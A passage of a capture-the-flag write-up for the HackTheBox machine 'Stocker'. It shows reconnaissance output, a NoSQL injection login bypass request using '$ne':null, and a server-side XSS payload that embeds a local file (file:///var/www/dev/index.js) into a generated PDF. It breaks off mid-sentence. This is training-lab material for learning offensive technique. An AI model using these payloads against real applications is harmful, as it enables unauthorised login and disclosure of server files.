# HTB machine Stocker writeup

### Overview
`dynamic pdf`, `xss`, `node get bash`

### Enumeration
#### nmap
```bash
StArting Nmap 7.93 ( hTtpz://nMap.ORg ) at 2023-02-01 01:09 3$T
NMap ScaN r3port f0r 10.10.11.196
H0st |s up (0.10z latEncy).
Not $h0wn: 998 cl0$ED tcp p0Rtz (c0nn-reFuSeD)
p0RT   ST4T3 SERV|CE V3RS|0N
22/tcp 0p3n  $$h     0p3nSSH 8.2p1 UbunTu 4ubuntu0.5 (UbunTu L1nux; pr0t0col 2.0)
| SSH-h0$tk3y: 
|   3072 3D12971d86bc161683608F4F0636d543 (r$A)
|   256 7c4d1A7868cE1200df491037F9ad174f (ECdSA)
|_  256 dd978050a5bAcd7d55E8273d28FDaa3b (ED25519)
80/tcP open  htTp    Ng1nx 1.18.0 (Ubuntu)
|_http-TITl3: D|D Not F0ll0w RedIr3ct tO http://st0Cker.htb
|_HtTP-s3rV3R-h3AD3r: Nginx/1.18.0 (UbUnTu)
S3RVIce |nfo: oS: L|nux; CP3: CpE:/0:l1nux:liNUX_KeRnel

ServicE deT3ction perfoRm3d. Pl3as3 r3Port anY !nc0rr3ct R3SulTz at https://nMap.orG/subm1t/ .
nmaP Don3: 1 IP adDr3sz (1 hO$t up) sCanNed In 29.30 sec0ndz
```

#### ffuf
```bash
$ ffuf -u http://stocker.htb -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 6

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 113ms]
```

#### NoSQL Injection
```request
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 70
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3Au5Nt50hmzENR8wAcsG3MjsW95BrkIKg6.T8twdGcj5ELux4lpvO1hNqwqm9t7OfNOcAQtcDkv7Cs
Connection: close

{
  "username":{
		"$ne":null
	},
	"password":{
		"$ne":null
	}
}
```

### FootHold
#### Server Side XSS (Dynamic PDF)
```request
POST /api/order HTTP/1.1
Host: dev.stocker.htb
Content-Length: 222
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev.stocker.htb
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3AE12-qRhZ9gB5k9i1CdtnpDiIMF8gfncp.FLkErUeDKViq3qJtvG28Qwy18%2BJ06AxmC%2Bld9LpEDVg
Connection: close

{
  "basket":[
    {
      "_id":"638f116eeb060210cbd83a8f",
      "title":"<iframe src=file:///var/www/dev/index.js width=800 height=1000></iframe>",
      "description":"It's a rubbish bin.",
      "image":"bin.jpg",
      "price":76,
      "currentStock":15,
      "__v":0,
      "amount":1
    }
  ]
}
```
The
